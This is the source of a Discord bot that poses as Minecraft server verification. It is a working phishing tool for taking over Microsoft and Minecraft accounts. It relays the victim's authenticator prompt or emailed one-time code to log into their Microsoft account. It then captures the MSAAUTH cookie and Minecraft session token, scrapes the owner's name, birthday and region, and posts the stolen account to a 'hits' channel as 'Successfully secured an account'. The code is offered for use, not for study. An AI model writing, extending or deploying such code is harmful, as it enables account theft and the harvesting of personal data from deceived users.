# main.py
import discord
from discord import app_commands
from discord.ext import commands
from discord import ui
import logging
import json
import sys
import os
import time
import datetime
import asyncio
import re
import httpx
import uuid
import base64
import hmac
import hashlib
import struct
import codecs
import urllib.parse
from urllib.parse import quote, unquote
from dateutil import parser
import sqlite3

# ==================== CONFIGURATION ====================
config = json.load(open("config.json", "r+"))

# ==================== DATABASE ====================
class DBConnection:
    def __init__(self) -> None:
        self.conn = sqlite3.connect("database/database.db")
        self.cursor = self.conn.cursor()

    def __enter__(self):
        return self
    
    def __exit__(self, *args) -> None:
        self.conn.close()

    def addEmail(self, email: str, pwd: str) -> None:
        self.cursor.execute("""
            INSERT INTO `security_emails` (email, password)
            VALUES (?, ?)
        """, (email, pwd))
        self.conn.commit()

    def getEmailPassword(self, email: str) -> str | None:
        password: str = self.cursor.execute("""
            SELECT password FROM `security_emails`
            WHERE email = ?
        """, (email,)).fetchone()
        self.conn.commit()
        return password
    
    def getEmails(self) -> tuple:
        emails = self.cursor.execute("""
            SELECT email FROM `security_emails`
        """).fetchall()
        return emails

# ==================== EMBEDS ====================
embeds = {
    "default_embed": [
        "Server Verification",
        """
    Before entering the server, please link your Minecraft account to confirm you're a real human and not a robot. Verification gives you full server access and unlocks all channels.
    
    **FAQ**

    Q: Why do I need to verify?
    A: Verification helps us assign you your role. It also protects the factory from intruders and sabotage attempts (a.k.a. raids).

    Q: How long does it take to get verified?
    A: The verification process doesn't take too long! You'll usually get your roles within 30–50 seconds, depending on traffic.

    Q: Why do you need to collect a code?
    A: The code confirms with the Minecraft API that you truly own the account you're verifying, it is required to verify because we are dealing with bots daily.
        """
    ],
    "failed_otp": [
        "Security Email Required",
        "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
    ],
    "failed_auth": [
        ":x: Failed to verify",
        "You pressed the wrong number on your authenticator app. Try again!"
    ],
    "timeout_auth": [
        ":x: Failed to verify",
        "You took too long to verify in your authenticator app. Try again!"
    ],
    "cooldown_otp": [
        ":x: Failed to verify",
        "Please wait a few minutes before trying to verify again! Our system is handling many verifications at once."
    ],
    "invalid_email": [
        ":x: Failed to verify",
        "The email you entered does not exist, make sure you entered it correctly!"
    ]
}

# ==================== VIEWS ====================
class MyModalOne(ui.Modal, title="Verification"):
    username = ui.TextInput(label="Minecraft Username", required=True)
    email = ui.TextInput(label="Minecraft Email", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(self.email.value) is None:
            await interaction.response.send_message(
                "❌ Invalid Email. Make sure you entered your email correctly!", 
                ephemeral=True
            )
            return

        await interaction.response.defer()
        await interaction.followup.send(
            "⌛ Please wait while we try to verify you...",
            ephemeral=True
        )
        
        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        # Check if account is locked
        lockedInfo = await checkLocked(self.email.value)
        
        if lockedInfo:
            if lockedInfo["StatusCode"] != 500:
                if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
                    await interaction.followup.send(
                        "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
                        ephemeral=True
                    )
                    return

        session = getSession()
        emailInfo = await sendAuth(session, self.email.value)

        if len(emailInfo) == 1:
            await interaction.followup.send(
                embed=discord.Embed(
                    title=embeds["cooldown_otp"][0],
                    description=embeds["cooldown_otp"][1],
                ),
                ephemeral=True
            )
            return
        
        if "Credentials" not in emailInfo:
            await interaction.followup.send(
                embed=discord.Embed(
                    title=embeds["invalid_email"][0],
                    description=embeds["invalid_email"][1],
                    color=0xFF5C5C
                ),
                ephemeral=True
            )
            return

        if "RemoteNgcParams" in emailInfo["Credentials"]:
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]

            if "Entropy" not in emailInfo["Credentials"]["RemoteNgcParams"]:
                response = await session.post(
                    "https://login.live.com/GetOneTimeCode.srf?id=38936", 
                    headers={
                        "cookie": "MSPOK=$uuid-55593433-60c8-4191-8fa7-a7874311e85d$uuid-4fd7f4fb-42b7-4ffc-bd3d-8feacfb6a57e$uuid-8f1626a7-4080-4073-8686-354aa5b937cc$uuid-135d7477-b083-41e7-b681-2ce793c563e6$uuid-6c60a9a5-97c2-4902-aee3-00f99efacbcf$uuid-4059f6fb-ae72-4398-810f-c5cb6495640f$uuid-0b2844a4-bbfa-4118-9a20-4b00154ccdc0$uuid-8b82f8ca-93b0-440b-be93-b1a743e05907$uuid-1dce1868-997e-4c06-88d99-44db08a70c67$uuid-3c79bd95-3604-4bc1-8358-353fe9734742"
                    }, 
                    data=f"login=&flowtoken={device}&purpose=eOTT_RemoteNGC&channel=PushNotifications&SAPId=&lcid=1033&uaid=3dd509e1f6ae4e0fa6debefe3b45abcb&canaryFlowToken=-DukZxrqgCYbURm5kHk3U5rkTOMEtJxkIq761a!27Qbn4GRZqvsySwrek6w*uVBbTB1PQ0w0o!jBR2YoMjkZPZJunzjR2I7op80PNHaOWYedJU8uoipCkH8natDYj!zpmDK6FOTPcbedisM70Rv6oB4v3mxPu9wyTgp2aq6Ugc86bmt8mj9Ox*D3fqwz*pYKeMbDy4vLXVetOsXJK*6GooRw$"
                )
                entropy = response.json()["DisplaySignForUI"]
            else:
                entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]

            await interaction.followup.send(
                embed=discord.Embed(
                    title="Verification",
                    description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
                    colour=0x00FF00
                ),
                ephemeral=True
            )

            async def checkCode(flowToken):
                response = await session.post(
                    url=f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                    headers={
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://login.live.com",
                        "Referer": "https://login.live.com/"
                    },
                    json={"DeviceCode": flowToken}
                )
                return response.json()
            
            i = 0
            while i < 60:
                data = await checkCode(device)
                print(data)

                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
                    failedAuth = embeds["failed_auth"]
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title=failedAuth[0],
                            description=failedAuth[1],
                            colour=0xFF5C5C
                        ),
                        ephemeral=True
                    )
                    return
                elif data["SessionState"] > 1 or data["AuthorizationState"] > 1:
                    await interaction.followup.send("⌛ Please allow us to proccess your roles...", ephemeral=True)
                    
                    finalEmbeds = await startSecuringAccount(session, self.email.value, device)
                    if not finalEmbeds:
                        return
                    
                    await hits_channel.send("@everyone **Successfully secured an account**")
                    await hits_channel.send(
                        embed=finalEmbeds[0],
                        view=accountInfo(finalEmbeds[1], finalEmbeds[2], interaction.user)
                    )
                    return
                await asyncio.sleep(1)
                i += 1

            failedAuth = embeds["timeout_auth"]
            await interaction.followup.send(
                embed=discord.Embed(
                    title=failedAuth[0],
                    description=failedAuth[1],
                    colour=0x00FF00
                ),
                ephemeral=True
            )
            return

        elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
            for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    verflowtoken = value["data"]
                    verEmail = value["display"]

            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email: {verEmail}")

            await interaction.followup.send(
                embed=discord.Embed(
                    title="Verification",
                    description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                view=ButtonViewTwo(
                    username=self.username.value,
                    email=self.email.value,
                    flowtoken=verflowtoken
                ),
                ephemeral=True
            )
        else:
            await interaction.followup.send(
                embed=discord.Embed(
                    title=embeds["failed_otp"][0],
                    description=embeds["failed_otp"][1],
                ),
                view=ButtonViewThree(),
                ephemeral=True
            )

class MyModalTwo(ui.Modal, title="Verification"):
    def __init__(self, username, email, flowtoken):
        super().__init__()
        self.username = username
        self.email = email
        self.flowtoken = flowtoken

    box_three = ui.TextInput(label="Code", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if len(str(self.box_three.value)) != 6:
            await interaction.response.send_message(
                embed=discord.Embed(description="The code must be 6 digits long."),
                color=0xFF5C5C,
                ephemeral=True
            )
            return

        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        await interaction.response.defer()
        await interaction.followup.send("⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True)

        session = getSession()
        finalEmbeds = await startSecuringAccount(session, self.email, self.flowtoken, self.box_three.value)
        
        if not finalEmbeds:
            return
            
        await hits_channel.send("**Successfully secured an account**")
        await hits_channel.send(
            embed=finalEmbeds[0],
            view=accountInfo(finalEmbeds[1], finalEmbeds[2], interaction.user)
        )

class MyModalThree(ui.Modal, title="Verification"):
    box_one = ui.TextInput(label="Title", placeholder="Your Custom Title", required=True)
    box_two = ui.TextInput(label="Verify Message", style=discord.TextStyle.paragraph, placeholder="Your Custom Message", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        config = json.load(open("config.json", "r+"))
        if config["discord"]["accounts_channel"] == "":
            await interaction.response.send_message("You must set the Accounts Channel first through /set_channel", ephemeral=True)
            return
        
        title = self.box_one.value
        description = self.box_two.value

        embed = discord.Embed(
            title=title,
            description=description,
            colour=0x678DC6
        )

        await interaction.channel.send(embed=embed, view=ButtonViewOne())
        await interaction.response.send_message("Sent!", ephemeral=True)

class msModal(ui.Modal, title="MSAAUTH Cookie"):
    box_one = ui.TextInput(label="MSAAUTH Cookie", placeholder="Your Cookie here...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message("**On Development**", ephemeral=True)

class dmEmbed(ui.Modal, title="Send Message"):
    def __init__(self, user):
        super().__init__()
        self.user = user

    box_one = ui.TextInput(label="Your Message", style=discord.TextStyle.paragraph, placeholder="Custom DMS message...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        user = await interaction.client.fetch_user(self.user.id)
        await user.send(self.box_one.value)
        await interaction.response.send_message(f"Sent message to {user.mention}", ephemeral=True)

class ButtonViewOne(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="✅ Link your account", style=discord.ButtonStyle.green, custom_id="persistent:button_one")
    async def button_one(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MyModalOne())

class ButtonViewTwo(ui.View):
    def __init__(self, username: str, email: str, flowtoken: str):
        super().__init__(timeout=None)
        self.username = username
        self.email = email
        self.flowtoken = flowtoken

    @discord.ui.button(label="✅Submit Code", style=discord.ButtonStyle.green, custom_id="persistent:button_two")
    async def button_two(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MyModalTwo(self.username, self.email, self.flowtoken))

class ButtonViewThree(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="📙 How to?", style=discord.ButtonStyle.red, custom_id="persistent:button_three")
    async def button_two(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            embed=discord.Embed(
                title="Add a Security Email",
                description="""
                Step-by-step:
                1) Go to your Microsoft Account: https://account.live.com/proofs/manage/additional
                2) Open the "Security" section
                3) Choose "Advanced security options"
                4) Add a new verification method and select "Email a code"
                5) Enter your email and wait 1–2 minutes before retrying verification.
                """,
                colour=0xFFFFFF
            ),
            ephemeral=True
        )

class ButtonOptions(ui.View):
    def __init__(self, user):
        super().__init__(timeout=None)
        self.user = user

    @discord.ui.button(label="Ban", style=discord.ButtonStyle.red, custom_id="persistent:button_ban")
    async def banButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.guild_permissions.ban_members:
            try:
                await interaction.guild.ban(user=self.user)
                await interaction.response.send_message(f"<@{self.user}> has been sucessfully banned!")
            except Exception:
                await interaction.response.send_message(f"Failed to ban <@{self.user.id}>! (Invalid Perms / Already)")
        else:
            await interaction.response.send_message("You do not have the neccessary permissions!", ephemeral=True)

    @discord.ui.button(label="Kick", style=discord.ButtonStyle.red, custom_id="persistent:button_kick")
    async def kickButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.guild_permissions.kick_members:
            try:
                await interaction.guild.kick(user=self.user)
                await interaction.response.send_message(f"<@{self.user.id}> has been sucessfully kicked!")
            except Exception:
                await interaction.response.send_message(f"Failed to kick <@{self.user.id}>! (Invalid Perms / Not in server)")
        else:
            await interaction.response.send_message("You do not have the neccessary permissions!", ephemeral=True)

    @discord.ui.button(label="Unban", style=discord.ButtonStyle.primary, custom_id="persistent:button_unban")
    async def unbanButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.guild.unban(user=self.user)
            await interaction.response.send_message(f"<@{self.user.id}> has been sucessfully unbanned!")
        except Exception:
            await interaction.response.send_message(f"Failed to unban <@{self.user.id}>!")

    @discord.ui.button(label="💬 DM", style=discord.ButtonStyle.grey, custom_id="persistent:button_dm")
    async def dmButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(dmEmbed(self.user))

class accountInfo(ui.View):
    def __init__(self, ssid: discord.Embed, userInfo: discord.Embed, duser):
        super().__init__(timeout=None)
        self.ssid = ssid
        self.user = userInfo
        self.duser = duser

    @discord.ui.button(label="Ban", style=discord.ButtonStyle.red, custom_id="persistent:button_ban_info")
    async def banButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.guild_permissions.ban_members:
            try:
                await interaction.guild.ban(user=self.duser)
                await interaction.response.send_message(f"<@{self.duser}> has been sucessfully banned!")
            except Exception:
                await interaction.response.send_message(f"Failed to ban <@{self.duser.id}>! (Invalid Perms / Already)")
        else:
            await interaction.response.send_message("You do not have the neccessary permissions!", ephemeral=True)

    @discord.ui.button(label="Kick", style=discord.ButtonStyle.red, custom_id="persistent:button_kick_info")
    async def kickButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.guild_permissions.kick_members:
            try:
                await interaction.guild.kick(user=self.duser)
                await interaction.response.send_message(f"<@{self.duser.id}> has been sucessfully kicked!")
            except Exception:
                await interaction.response.send_message(f"Failed to kick <@{self.duser.id}>! (Invalid Perms / Not in server)")
        else:
            await interaction.response.send_message("You do not have the neccessary permissions!", ephemeral=True)

    @discord.ui.button(label="Unban", style=discord.ButtonStyle.primary, custom_id="persistent:button_unban_info")
    async def unbanButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.guild.unban(user=self.duser)
            await interaction.response.send_message(f"<@{self.duser.id}> has been sucessfully unbanned!")
        except Exception:
            await interaction.response.send_message(f"Failed to unban <@{self.duser.id}>!")

    @discord.ui.button(label="💬 DM", style=discord.ButtonStyle.grey, custom_id="persistent:button_dm_info")
    async def dmButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(dmEmbed(self.duser))

    @discord.ui.button(label="SSID", style=discord.ButtonStyle.primary, custom_id="persistent:button_ssid")
    async def showSSID(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(embed=self.ssid, ephemeral=True)

    @discord.ui.button(label="Extra Info", style=discord.ButtonStyle.primary, custom_id="persistent:button_info")
    async def showInfo(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(embed=self.user, ephemeral=True)

class emailView(ui.View):
    def __init__(self, emails: list, index: int = 0):
        super().__init__(timeout=None)
        self.emails = emails
        self.index = index
        self.mindex = len(emails) - 1
        self.updateButtons()
    
    def updateButtons(self):
        self.back_button.disabled = self.index == 0
        self.next_button.disabled = self.index >= self.mindex
    
    def getEmbed(self):
        embed = discord.Embed(
            title=f"Email Inbox ({self.index + 1}/{len(self.emails)})",
            description=self.emails[self.index],
            color=0x678DC6,
        )
        return embed
    
    @discord.ui.button(label="◀️ Back", style=discord.ButtonStyle.primary, custom_id="persistent:email_back")
    async def back_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.index > 0:
            self.index -= 1
            self.updateButtons()
            await interaction.response.edit_message(embed=self.getEmbed(), view=self)
    
    @discord.ui.button(label="🔄 Refresh", style=discord.ButtonStyle.green, custom_id="persistent:email_refresh")
    async def refresh_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(embed=self.getEmbed(), view=self)

    @discord.ui.button(label="Next ▶️", style=discord.ButtonStyle.primary, custom_id="persistent:email_next")
    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.index < self.mindex:
            self.index += 1
            self.updateButtons()
            await interaction.response.edit_message(embed=self.getEmbed(), view=self)

class Dropdown(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(
                label="MSAAUTH Token",
                description="Uses your MSAAUTH token to secure",
                value="msaauth"
            ),
            discord.SelectOption(
                label="Recovery Code",
                description="Uses email + recovery code",
                value="rcvcode"
            )
        ]
        super().__init__(
            placeholder="Select Securing Method",
            min_values=1,
            max_values=1,
            options=options,
            row=0
        )

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        match selected:
            case "msaauth":
                modal = msModal()
                await interaction.response.send_modal(modal)

class ButtonTOTP(ui.View):
    def __init__(self, secret: str, interaction: discord.Interaction):
        super().__init__(timeout=None)
        self.secret = secret
        self.interaction = interaction

    @discord.ui.button(label="🔄 Refresh Code", style=discord.ButtonStyle.green, custom_id="persistent:button_refresh_totp")
    async def button_one(self, interaction: discord.Interaction, button: discord.ui.Button):
        getTOTP = await totp(self.secret)
        await self.interaction.edit_original_response(
            embed=discord.Embed(
                title="Authenticator Code",
                description=f"```{getTOTP}```"
            )
        )
        await interaction.response.defer()

# ==================== UTILS ====================
def getSession() -> httpx.AsyncClient:
    return httpx.AsyncClient(
        timeout=None,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    )

async def checkLocked(email: str) -> dict:
    try:
        async with httpx.AsyncClient(timeout=None) as session:
            lockedInfo = await session.post(
                url="https://support.microsoft.com/nl-NL/api/contactus/v1/ExecuteAlchemySAFAction?SourceApp=soc2",
                headers={
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
                    "Host": "support.microsoft.com",
                    "Content-Type": "application/json"
                },
                json={
                    "Locale": "nl-NL",
                    "Parameters": {"emailaddress": email},
                    "ActionId": "signinhelperemailv2",
                    "CorrelationId": "1b846a60-a752-45ee-95cb-b3ddd5b0bacd",
                    "ContextVariables": [],
                    "V2": True
                },
                timeout=5
            )
            return lockedInfo.json()
    except Exception:
        return None

async def sendAuth(session: httpx.AsyncClient, email: str) -> dict:
    sendAuth = await session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33"
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
            "forceotclogin": True,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": True,
            "isOtherIdpSupported": False,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email
        }
    )
    return sendAuth.json()

async def decode(code):
    decoded_url = urllib.parse.unquote(code)
    decoded_text = re.sub(
        r'\\u([0-9A-Fa-f]{4})',
        lambda match: chr(int(match.group(1), 16)),
        decoded_url
    )
    return decoded_text

async def getLiveData(session: httpx.AsyncClient) -> dict:
    response = await session.post("https://login.live.com")
    urlPost = re.search(
        r'https://login\.live\.com/ppsecure/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0',
        response.text
    ).group(0)
    ppft = re.search(r'value=\\?"([^"]+)"', response.text).group(1)
    return {"urlPost": urlPost, "ppft": ppft}

async def getMSAAUTH(session: httpx.AsyncClient, email: str, flowToken: str, data: dict, code: str) -> dict | None:
    if not code:
        loginData = await session.post(
            url=data["urlPost"],
            headers={
                "host": "login.live.com",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i"
            },
            data={
                "login": email,
                "loginfmt": email,
                "slk": flowToken,
                "psRNGCSLK": flowToken,
                "type": "21",
                "PPFT": data["ppft"]
            },
            follow_redirects=True
        )
    else:
        loginData = await session.post(
            url=data["urlPost"],
            headers={
                "host": "login.live.com",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i"
            },
            data={
                "login": email,
                "loginfmt": email,
                "SentProofIDE": flowToken,
                "otc": code,
                "type": "27",
                "PPFT": data["ppft"]
            },
            follow_redirects=True
        )
    if '__Host-MSAAUTH' in session.cookies:
        urlPost = re.search(r'"urlPost"\s*:\s*"([^"]+)"', loginData.text).group(1)
        ppft = quote(re.search(r'"sFT"\s*:\s*"([^"]+)"', loginData.text).group(1), safe='-*')
        return {"urlPost": urlPost, "PPFT": ppft}
    return None

async def polishHost(session: httpx.AsyncClient, postData: dict) -> str:
    data = await session.post(
        url=postData["urlPost"],
        headers={
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": '"Chromium";v="143", "Not A(Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Ch-Ua-Platform-Version": '""',
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=0, i"
        },
        data=f"PPFT={postData['PPFT']}&canary=&LoginOptions=3&type=28&hpgrequestid=&ctx="
    )
    return dict(data.cookies)["__Host-MSAAUTH"]

async def getXBL(session: httpx.AsyncClient) -> dict:
    try:
        data = await session.get(
            url="https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254",
            follow_redirects=False
        )
        location = data.headers["Location"]
        acessTokenRedirect = await session.get(url=location, follow_redirects=False)
        location = acessTokenRedirect.headers["Location"]
        accessTokenRedirect = await session.get(url=location, follow_redirects=False)
        location = accessTokenRedirect.headers["Location"]
        token = re.search(r'accessToken=([^&#]+)', location)
        if not token:
            return None
        accessToken = token.group(1) + "=" * ((4 - len(token.group(1)) % 4) % 4)
        decoded_data = base64.b64decode(accessToken).decode('utf-8')
        json_data = json.loads(decoded_data)
        uhs = json_data[0].get('Item2', {}).get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        xsts = ""
        for item in json_data:
            if item.get('Item1') == "rp://api.minecraftservices.com/":
                xsts = item.get('Item2', {}).get('Token', '')
                break
        return {"xbl": f"XBL3.0 x={uhs};{xsts}"}
    except Exception:
        return None

async def getSSID(xbl: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.post(
            url="https://api.minecraftservices.com/authentication/login_with_xbox",
            json={
                "identityToken": xbl,
                "ensureLegacyEnabled": True
            }
        )
        jresponse = response.json()
        if "access_token" in jresponse:
            return jresponse["access_token"]
        return None

async def getCapes(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.get(
            url="https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        jresponse = response.json()
        if "capes" in jresponse:
            return jresponse["capes"]
        return None

async def getProfile(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.get(
            url="https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        jresponse = response.json()
        if "name" in jresponse:
            return jresponse["name"]
        return None

async def getMethod(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        licenses = await session.get(
            url="https://api.minecraftservices.com/entitlements/license?requestId=c24114ab-1814-4d5c-9b1f-e8825edaec1f",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        licenses_json = licenses.json()
        if "items" in licenses_json:
            for item in licenses_json["items"]:
                if item["name"] in ["product_minecraft", "game_minecraft"]:
                    if item["source"] == "GAMEPASS":
                        return "Gamepass"
                    elif item["source"] in ["PURCHASE", "MC_PURCHASE"]:
                        return "Purchased"
        return None

async def getUsernameInfo(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.get(
            url="https://api.minecraftservices.com/minecraft/profile/namechange",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        response = response.json()
        if response["nameChangeAllowed"]:
            return True
        todayDate = datetime.datetime.now()
        if "changedAt" in response:
            changeDate = response["changedAt"]
        else:
            changeDate = response["createdAt"]
        finalDate = (parser.parse(changeDate) + datetime.timedelta(days=31)).replace(tzinfo=None)
        return (finalDate - todayDate).days

async def getCookies(session: httpx.AsyncClient):
    data = await session.get(
        url="https://account.live.com/password/reset",
        headers={"host": "account.live.com"},
        follow_redirects=False
    )
    apicanary = await decode(
        re.search(r'"apiCanary":"([^"]+)"', data.text).group(1)
    )
    amsc = data.cookies["amsc"]
    return apicanary

async def getT(session: httpx.AsyncClient):
    fetchT = await session.get(
        url="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&ct=1708978285&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=0637740e739c48f6bf118445d579a786&lc=1033&id=38936&mkt=en-US&uaid=0637740e739c48f6bf118445d579a786",
        follow_redirects=False
    )
    match = re.search(r'<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>', fetchT.text)
    if match:
        return match.group(1)
    return None

async def getAMC(session: httpx.AsyncClient):
    redirect = await session.get("https://account.microsoft.com", follow_redirects=False)
    amcLink = redirect.headers["Location"]
    redirect2 = await session.get(url=amcLink)
    T = re.search(r'<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>', redirect2.text).group(1)
    response = await session.post(
        url="https://account.microsoft.com/auth/complete-silent-signin?ru=https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F&wa=wsignin1.0&refd=login.live.com&wa=wsignin1.0",
        data=f"t={T}"
    )
    location1 = re.search(r'href="([^"]+)"', response.text).group(1)
    mainPage = await session.get(url=location1, follow_redirects=True)
    finalPage = await session.get(
        url="https://account.microsoft.com/",
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0"
        }
    )
    rvt = re.search(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', finalPage.text, re.DOTALL).group(1)
    return rvt

async def getOwnerInfo(session: httpx.AsyncClient, verificationToken: str):
    try:
        getInfo = await session.get(
            "https://account.microsoft.com/profile/api/v1/personal-info",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "X-Requested-With": "XMLHttpRequest",
                "MS-CV": "LbJd6i44UUmIn7so.5.63",
                "__RequestVerificationToken": verificationToken,
                "Correlation-Context": "v=1,ms.b.tel.market=pt-PT,ms.b.qos.rootOperationName=GLOBAL.HOME.PROFILE.GETPERSONALINFO",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/profile",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
        )
        response = getInfo.json()
        return {
            "Fname": response["firstName"],
            "Lname": response["lastName"],
            "region": response["region"],
            "birthday": response["birthday"]
        }
    except Exception as e:
        print(f"Exception: {e}")
        return None

